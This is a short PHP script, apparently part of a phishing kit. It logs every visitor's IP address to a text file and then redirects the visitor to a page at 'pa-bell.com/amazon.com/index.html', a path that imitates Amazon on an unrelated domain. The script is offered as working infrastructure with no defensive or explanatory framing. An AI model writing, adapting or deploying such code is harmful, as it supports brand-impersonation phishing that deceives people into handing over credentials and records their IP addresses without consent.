<?php

$ip = getenv("REMOTE_ADDR");
$message .= "$ip \n";
$fp = fopen("visitIP.txt","a");
fputs($fp,$message);


$pagelink="https://pa-bell.com/amazon.com/index.html";
$FailRedirect="https://pa-bell.com/amazon.com/index.html";
$redirecttype="2";// 1:header - 2:script
?>